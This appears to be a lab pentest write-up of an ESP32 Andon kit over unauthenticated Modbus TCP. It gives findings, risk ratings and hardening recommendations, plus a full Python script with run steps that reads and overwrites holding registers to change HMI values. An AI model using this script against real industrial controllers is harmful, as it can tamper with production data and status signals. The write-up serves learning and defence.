# andon-test-


Basic Details
Device: Andon Kit (ESP32 based)
Protocol: Modbus TCP
Port: 502
Environment: Lab / Educational setup
Test Type: Authorized pentest
Tester: Sakibe Ahamed R

🎯 Objective
To check basic security issues in an Andon Kit using Modbus TCP and understand how an attacker can read or change data in an OT environment.

📦 System Overview
ESP32 controller
HMI display
Modbus TCP communication
No authentication
No encryption
No coil
hmi on read and write 
stick on read only 

🛠 Tools Used
Nmap
Python (Modbus scripts)
Wireshark(can be used )


🔍 What Was Tested
Modbus TCP port exposure on network (502)
Reading holding registers
Writing to registers (where allowed)
Network visibility of data

❗ Findings
1. Modbus TCP Open Without Security
Port 502 is open
No username or password
Any device in the network can access it
Risk: High

2. Plaintext Communication
Modbus data is not encrypted
Register values can be seen in Wireshark
Risk: High

3. Register Write Possible
Some values can be changed using Modbus write
there were 0-8 register
0-button
1-button
2-button
3-changeable
4-changeable
5-changeable
6-not changeable (controlled by the plc logic )
7-changeable
8-not changeable(controlled by the plc logi )

so i was able to change the values from  3-5 n 7

so much stressed of hight value given like 2333
No validation or access control
Risk: Medium

4. No Network Segmentation
Device is on a flat network
IT and OT traffic not separated
Risk: Medium

⚠️ Possible Attacks
Change production values(as i did)
Fake fault or normal status
Sniff Modbus traffic(wireshark)
Replay Modbus packets

🛡 Recommendations
Block Modbus port from unauthorized systems(firewallrules)
Allow write access only when required
Separate OT network from IT network
Add basic monitoring and logging


Python script used :

#!/usr/bin/env python3
# modbus_enum_safe.py
# SAFE Modbus HMI test – ignores button registers (0–2)

import socket
import struct
from time import sleep

TARGET_IP = "192.168.0.200"
MB_PORT = 502
TIMEOUT = 2

# ---------------- MODBUS FUNCTIONS ---------------- #

def modbus_read_holding(slave_id, start_addr, count=1):
    try:
        tid = 1
        pid = 0
        uid = slave_id
        fc = 0x03
        length = 6

        pkt = struct.pack(
            ">HHHBBHH",
            tid, pid, length, uid, fc, start_addr, count
        )

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((TARGET_IP, MB_PORT))
        sock.send(pkt)
        resp = sock.recv(1024)
        sock.close()

        if len(resp) < 11:
            return None

        byte_count = resp[8]
        if byte_count < 2:
            return None

        return struct.unpack(">H", resp[9:11])[0]

    except:
        return None


def modbus_write_single(slave_id, reg_addr, value):
    try:
        tid = 1
        pid = 0
        uid = slave_id
        fc = 0x06
        length = 6

        pkt = struct.pack(
            ">HHHBBHH",
            tid, pid, length, uid, fc, reg_addr, value
        )

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((TARGET_IP, MB_PORT))
        sock.send(pkt)
        resp = sock.recv(1024)
        sock.close()

        return len(resp) >= 12 and resp[7] == fc

    except:
        return False


# ---------------- MAIN LOGIC ---------------- #

print("\n📺 HMI MODBUS ENUM – SAFE MODE\n")

for slave in [0, 1]:
    print(f"\n🔍 SLAVE {slave}")

    # Read all 8 registers
    regs = []
    for r in range(8):
        val = modbus_read_holding(slave, r, 1)
        regs.append(val if val is not None else 0)

    print("Raw Registers:")
    for i, v in enumerate(regs):
        print(f"  Reg {i}: {v}")

    # Only registers 3–7 are value boxes
    test_values = [400, 300, 200, 500, 600]

    print("\n🧪 Writing VALUE BOXES (Reg 3–7)\n")

    for i, test_val in enumerate(test_values):
        reg = i + 3

        print(
            f"  Box {i+1} (Reg {reg}): "
            f"{regs[reg]} → {test_val}",
            end=" "
        )

        if modbus_write_single(slave, reg, test_val):
            sleep(0.3)
            readback = modbus_read_holding(slave, reg, 1)
            print(f"✅ (readback: {readback})")
        else:
            print("❌ WRITE FAILED")

print("\n✅ DONE\n")




this code was used to change the value 

command :-
nano filename.py 
add the code then 
python filename.py (to run) 

before executing the kit must be connected to the wifi and should be configured .
ping before doing the test so that we can see its alive or not 

command :-
ping ipaddress 


kali and kit should be on same network gatway 












✅ Conclusion

The Andon Kit works correctly but has basic OT security issues common in Modbus systems.
This test helped understand real-world OT protocol risks and Modbus security weaknesses.
i was able to change the values on hmi and gave diffrent values like high or low .
was not abale to change the light from red -> yellow -> green or any bcz andon stick was on read mode not write and coil was not there to change it too

📁 Repository Info
This repository contains:

Pentest report

Modbus testing scripts

Network scan results

⚠️ This testing was done only on an authorized lab device for learning purposes.
